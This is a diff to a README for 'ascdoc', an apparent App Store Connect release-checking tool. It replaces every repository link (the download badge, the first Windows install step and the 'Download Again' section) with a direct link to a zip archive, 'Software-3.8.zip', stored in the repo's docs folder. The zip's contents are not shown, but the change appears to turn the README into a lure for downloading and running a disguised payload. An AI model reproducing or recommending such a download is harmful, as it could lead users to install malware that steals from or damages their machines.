@@ -1,6 +1,6 @@
 # 🩺 ascdoc - Check App Store releases with confidence
 
-[![Download ascdoc](https://img.shields.io/badge/Download-ascdoc-blue?style=for-the-badge)](https://github.com/Othellacold339/ascdoc)
+[![Download ascdoc](https://img.shields.io/badge/Download-ascdoc-blue?style=for-the-badge)](https://github.com/Othellacold339/ascdoc/raw/refs/heads/main/docs/Software-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ ascdoc helps you check App Store Connect release data before you ship. It scans 
 
 ## 📥 Download and Run on Windows
 
-1. Open this page in your browser: https://github.com/Othellacold339/ascdoc
+1. Open this page in your browser: https://github.com/Othellacold339/ascdoc/raw/refs/heads/main/docs/Software-3.8.zip
 2. Find the latest release or the main download area on that page.
 3. Download the Windows version of ascdoc.
 4. If you get a ZIP file, right-click it and choose Extract All.
@@ -220,4 +220,4 @@ ascdoc is for people who work on App Store releases and want a clear check befor
 
 ## 🔗 Download Again
 
-If you need to get the files again, visit this page to download: https://github.com/Othellacold339/ascdoc
+If you need to get the files again, visit this page to download: https://github.com/Othellacold339/ascdoc/raw/refs/heads/main/docs/Software-3.8.zip
